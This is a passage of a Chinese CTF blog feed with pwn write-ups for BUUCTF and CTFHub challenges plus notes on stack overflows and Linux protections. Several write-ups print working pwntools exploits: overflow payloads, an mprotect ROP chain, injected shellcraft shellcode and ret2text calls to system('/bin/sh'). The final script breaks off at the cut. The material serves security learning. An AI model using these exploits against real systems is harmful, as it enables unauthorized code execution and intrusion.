src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-4.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-5.png"></p><p>然后经过了解找到了第二种解法,运用到了mprotect函数,初步了解一下这个函数，</p><p>int mprotect(const void *start, size_t len, int prot);</p><p>argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt&#x2F;.bss起始地址) </p><p>argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)</p><p>argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 &#x3D; 4 + 2 +1 (rwx)：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./not_the_same'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27864</span><span class="token punctuation">)</span>mprotect_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>read_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop3_edi_esi_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806fcc8</span>mem_addr <span class="token operator">=</span> <span class="token number">0x080EB000</span> <span class="token comment">#.got.plt 的起始地址</span>mem_size <span class="token operator">=</span> <span class="token number">0x1000</span>mem_type <span class="token operator">=</span> <span class="token number">0x7</span> <span class="token comment"># 可执行权限</span>payload <span class="token operator">=</span> <span class="token number">0x2D</span> <span class="token operator">*</span> <span class="token string">b'a'</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mprotect_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop3_edi_esi_ebx_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mem_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>mem_size<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>mem_type<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop3_edi_esi_ebx_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>mem_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mem_addr<span class="token punctuation">)</span>    <span class="token comment">#将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># read写入shellcode</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后成功打通：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-6.png"></p><h1 id="2-ciscn-2019-n-5（BUUCTF）"><a href="#2-ciscn-2019-n-5（BUUCTF）" class="headerlink" title="2. ciscn_2019_n_5（BUUCTF）"></a>2. ciscn_2019_n_5（BUUCTF）</h1><p>首先对文件进行检查：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-7.png"></p><p>好了，这下发现它并没有开启任何保护（心中窃喜），然后将程序放入ida中进行反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-8.png"></p><p>发现整个程序比较简单，没有其他有关system的函数，分析一下这个程序，由于read我们无法对name实现溢出，属于全局变量，而后面出现的gets函数，我们可以实现栈溢出，于是我们可以产生这样的想法，我们将shellcode写入name中，然后通过gets函数的返回地址指向shellcode，说干就干，构造的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyrop'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28342</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00601080</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What do you want to say to me?"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而我们发现并没有打通，出现了各种各样的错误，md：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-9.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-10.png"></p><p>上面两个是分别在远程和本地打通的情况，每次都不知道出现了啥问题（心态爆炸），然后我通过对比网上其他人的脚本，发现不同点在于没有加上context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’),通过上网查找资料了解了context这个函数参数的作用：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-11.png"></p><p>后面一句话是：可以避免在完成CTF题目时出现一些和IO相关的错误。</p><p>总算是找到了错误的地方了！！！</p><p>然后我们重新构造exp之后：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyrop'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28342</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00601080</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What do you want to say to me?"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打通结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-12.png"></p><h1 id="3-ciscn-2019-ne-5（BUUCTF）"><a href="#3-ciscn-2019-ne-5（BUUCTF）" class="headerlink" title="3. ciscn_2019_ne_5（BUUCTF）"></a>3. ciscn_2019_ne_5（BUUCTF）</h1><p>首先对程序进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-13.png"></p><p>开启了NX保护，我们将其放入到ida中反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-14.png">14.png)</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-15.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-16.png"></p><p>我们可以找到明显的getflag函数，但是main主函数并不能进行反编译，只有一段汇编代码，还好我之前学过一点汇编语言（上图是已经反编译过的，我第一次用的时候没有反编译过来，震惊…….），程序的大致意思还是可以理解，我们可以通过输入administrator，然后输入1可以对getflag函数中可以的src进行赋值，然后我们再输入4，就可以实现跳转到getflag函数，接着我们构造exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_ne_5'</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>sh_addr <span class="token operator">=</span> <span class="token number">0x080482ea</span><span class="token comment">#p = process('./ciscn_2019_ne_5')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26734</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'password:'</span><span class="token punctuation">,</span><span class="token string">'administrator'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x48</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'info:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实对于我们查找sh地址和system函数地址我们可以在终端使用命令来查找，但是为了更熟练的运用elf我还是选择使用上述的方法[doge]</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-17.png"></p><p>打通的结果如下所示：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-18.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-19.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-20.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ret2shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的栈溢出</title>
      <link href="/uncategorized/%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/uncategorized/%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="简单的栈溢出"><a href="#简单的栈溢出" class="headerlink" title="简单的栈溢出"></a>简单的栈溢出</h1><p>栈溢出的前提：<br>1.程序必须向栈上写入数据<br>2.写入的数据大小没有被良好的控制</p><p>stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example -no-pie<br>-m32 表示生成32位程序<br>-fno-stack-protector 表示不开启堆栈保护（不生成canary）<br>-no-pie 关闭PIE（避免加载基址被打乱）gcc -v查看默认的开关情况,若存在–enable-default-pie代表PIE默认开启</p><p>使用checksec检查编译出的文件<br>➜  stack-example checksec stack_example<br>Arch:   i386-32-little<br>RELRO:   Partial RELRO<br>Stack:   No canary found<br>NX:    NX enabled<br>PIE:    No PIE (0x8048000)<br>注意：<br>提到编译时的PIE保护，linux还存在地址空间分布随机化（ASLR），只有可执行文件开启了PIE保护，还需系统开启ASLR才会打乱基址，否则程序运行时依旧会加载一个固定的基址（和NO PIE基址不同），可以通过：<br>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space来控制 ASLR 启动与否，具体的选项有<br>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。<br>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。<br>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</p><p>IDA反编译工具</p><h2 id="栈溢出的重要步骤"><a href="#栈溢出的重要步骤" class="headerlink" title="栈溢出的重要步骤"></a>栈溢出的重要步骤</h2><p>1、寻找危险函数<br>输入：gets(直接读取一行，忽略’\x00’)、scanf、vscanf<br>输出：sprintf<br>字符串：strcpy(字符串复制，遇到’\x00’停止)、strcat(字符串拼接，遇到’\x00’停止)、bcopy<br>2、确定填充长度<br>计算我们所要操作的地址与我们所要覆盖的地址的距离，操作方法就是打开IDA，根据给定的地址计算偏移，一般变量会有以下几种索引模式：<br>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得<br>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。<br>直接地址索引，就相当于直接给定了地址。<br>一般来说，我们会有如下的覆盖需求：<br>覆盖函数返回地址，这时候就是直接看 EBP 即可。<br>覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。<br>覆盖 bss 段某个变量的内容。<br>根据现实执行情况，覆盖特定的变量或地址的内容。<br>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。</p><h1 id="自主学习部分"><a href="#自主学习部分" class="headerlink" title="自主学习部分"></a>自主学习部分</h1><p>1、Linux中的保护机制<br>①canary（栈保护）<br>原理：栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。<br>编译参数：-fno-stack-protector &#x2F;-fstack-protector &#x2F; -fstack-protector-all (关闭 &#x2F; 开启 &#x2F; 全开启)<br>②NX（no execute不可执行）<br>原理：将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。<br>编译参数：-z execstack &#x2F; -z noexecstack (关闭 &#x2F; 开启)<br>③PIE（position-independent executables，地址无关可执行文件）<br>原理：一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防御技术。同ASLR同样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序自己的gadget也失效。<br>编译参数：-no-pie &#x2F; -pie (关闭 &#x2F; 开启)<br>④RELRO(read only relocation)<br>原理及介绍：在Linux系统安全领域，数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术:。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。<br>编译参数：-z norelro &#x2F; -z lazy &#x2F; -z now (关闭 &#x2F; 部分开启 &#x2F; 完全开启)</p><p>2、ESP寄存器存储的是在调用函数fun()之后，栈的栈顶，并且始终指向栈顶。<br>EBP寄存器存储的是栈的栈底指针，通常叫栈基址，这个是一开始进行fun()函数调用之前，由ESP传递给EBP的。（在函数调用前你可以这么理解：ESP存储的是栈顶地址，也是栈底地址。）<br>EIP寄存器存储的是CPU下次要执行的指令的地址。<br>ECX一般用来当作计数器,EDX是数据寄存器,EAX是累加器,EBX是基址寄存器,  ESI是源变址寄存器,EDI是目的变址寄存器,ESP是堆栈指针寄存器,EBP是基址指针寄存器,其中ESP和EBP一般是针对堆栈而言。<br>push指的是入栈，在程序中常用来暂存某些数据<br>pop指的是出栈，可对数据进行恢复<br>call指的是将返回地址（也就是call指令要执行时EIP的值）压入栈顶，然后是将程序跳转到当前调用的方法的起始地址。<br>jz是ZF汇编语言中的PSW标志寄存器中的一位，JZ则是根据ZF决定是否跳转。若ZF&#x3D;1（表示本次运算结果为0，不为0则ZF&#x3D;0），则跳转，否则不跳转。</p><p>3、溢出分为缓冲区溢出、内存溢出、数据溢出<br>危险函数：<br>输入：gets(直接读取一行，忽略’\x00’)、scanf、vscanf<br>输出：sprintf<br>字符串：strcpy(字符串复制，遇到’\x00’停止)、strcat(字符串拼接，遇到’\x00’停止)、bcopy</p><p>4、GDB可以做四种主要的事情（加上支持这些的其他事情）来帮助你捕捉到行动中的错误：</p><ul><li>启动程序，指定可能影响其行为的任何内容。</li><li>使程序在指定条件下停止。</li><li>检查程序停止时发生了什么。</li><li>更改程序中的内容，以便您可以尝试纠正一个错误的影响，并继续了解另一个错误。</li></ul><p>jdb一般在IDE中自带、在linux环境下需要安装（Centos、Ubuntu自带）<br>若要调试程序，编译时还需要加上-g选项让编译生成的可执行文件中包含足够的调试信息，包含代码、栈、局部变量等，若还需查看更多信息如宏定义则需添加-g3选项，这样就可以通过print命令打印宏定义信息。</p><h1 id="刷题分享"><a href="#刷题分享" class="headerlink" title="刷题分享"></a>刷题分享</h1><h3 id="CTFHub—ret2text"><a href="#CTFHub—ret2text" class="headerlink" title="CTFHub—ret2text"></a>CTFHub—ret2text</h3><p>思路及解题步骤：</p><ul><li>首先对文件进行分析，获得的结果如下所示：</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1.png"></p><ul><li>发现其为64位的文件</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-2.png"></p><ul><li>发现没有开启任何的保护，将其直接代入IDA进行反汇编操作</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-3.png"></p><ul><li>发现经典的gets危险函数，可以实现<strong>栈溢出</strong></li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-4.png"></p><ul><li>通过观察到secure函数中存在着&#x3D;&#x3D;system(“&#x2F;bin&#x2F;sh”)&#x3D;&#x3D;函数，以此我们可以找到system函数的地址，同时将v4的值进行溢出，返回执行指定的system函数</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-5.png"></p><ul><li>获得的system函数的地址为0x004007b8</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-6.png"></p><ul><li>由此我们可以计算对v4需要填充的无用数据长度为0x70+8,然后我们开始写exp：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#p = process('./pwn2')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"challenge-dda26e33984a0d6c.sandbox.ctfhub.com"</span><span class="token punctuation">,</span><span class="token number">35387</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x004007B8</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>由于之前已经打通，忘记了截图，直接在本地的机子上执行，运行结果如下所示：</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-7.png"></p><h3 id="BUUCTF—pwn1-sctf-2016"><a href="#BUUCTF—pwn1-sctf-2016" class="headerlink" title="BUUCTF—pwn1_sctf_2016"></a>BUUCTF—pwn1_sctf_2016</h3><p>灵感来源: <a href="https://blog.csdn.net/nicesa/article/details/107416316">https://blog.csdn.net/nicesa/article/details/107416316</a><br>思路及解题步骤：</p><ul><li>首先对文件进行分析：</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-8.png"></p><ul><li>发现文件是一个32位的程序，同时开启了NX保护，将文件代入IDA进行反汇编操作</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-9.png"></p><ul><li>由图可知,我们知道了对s变量开辟的空间为60个字节,但是fgets函数对我们限制输入32个字节,开始以为是不会造成<strong>栈溢出</strong>,但后面出现了字符替换,即将字符’I’替换成’you’,我们可以输入20个’I’,就可以实现<strong>栈溢出</strong>.</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-10.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-11.png"></p><ul><li>然后我们发现了get_flag函数，里面存在着system函数，就此我们可以找到system函数的地址：0x08048f0d</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-12.png"></p><ul><li>接着我们就可以写exp</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token comment">#p = process('./pwn5')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">27974</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'I'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span>  <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08048f0d</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>由于之前已经打通，直接在本机执行，执行结果如下：</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-13.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-14.png"></p><h3 id="BUUCTF—jarvisoj-level0"><a href="#BUUCTF—jarvisoj-level0" class="headerlink" title="BUUCTF—jarvisoj_level0"></a>BUUCTF—jarvisoj_level0</h3><p>思路及解题步骤：</p><ul><li>首先对文件进行分析，发现其是一个64位的文件，然后开起了NX保护</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-15.png"></p><ul><li>同理将其代入IDA进行分析,我们发现在main函数中返回的是vulnerable_function函数，而在vulnerable_function函数中返回的是read(0, &amp;buf, 0x200uLL),由此我们可以对buf这个变量进行<strong>栈溢出</strong>,变量buf的空间为0x80h个字节，发现callsystem函数的地址为：0x00400596</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-16.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-17.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-18.png"></p><ul><li>然后开始写exp：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># p = process('./level0')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">26668</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x00400596</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>由于之前已经打通，忘记截图，在本地的机子上执行结果如下：</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-19.png"></p><h1 id="刷题总结"><a href="#刷题总结" class="headerlink" title="刷题总结"></a>刷题总结</h1><p>经过这几道题下来，容易确定下来栈溢出几个大方向的思路：</p><ul><li>没有PIE：ret2libc</li><li>NX关闭：ret2shellcode</li><li>其他思路：ret2csu、ret2text</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四周笔记</title>
      <link href="/uncategorized/%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/uncategorized/%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="1-题目来源—BUUCTF（-OGeek2019-babyrop）"><a href="#1-题目来源—BUUCTF（-OGeek2019-babyrop）" class="headerlink" title="1. 题目来源—BUUCTF（[OGeek2019]babyrop）"></a>1. 题目来源—BUUCTF（[OGeek2019]babyrop）</h2><p>首先对程序进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-1.png"></p><p>可以发现程序开启了NX保护，但没有开启canary保护，我们将程序放入ida中分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-2.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-3.png"></p><p> <img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-4.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-5.png"></p><p>主函数main调用了几个子函数，第一个函数对于整体并没有什么影响，所以我们不用管这个，接着对参数a1的值是由前面的函数随机生成，然后用我们进行输入的字符与其进行比较，若没有相同的字符，则整个程序退出，由于是随机生成，所以我们无法让输入的buf与s相等，但我们可以更改v1的值，判断使它们的相同字符为0,我们可以在输入的buf第一个字符输入’\x00’这样就可以绕过strlen函数，由于程序中也没有找到system和binsh这样的字符，所以我们这是个明显的libc问题，构建的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">29820</span><span class="token punctuation">)</span><span class="token comment"># r = process('./babyrop')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/hu/桌面/babyrop'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token operator">+</span><span class="token string">b'\xff'</span><span class="token operator">*</span><span class="token number">7</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token 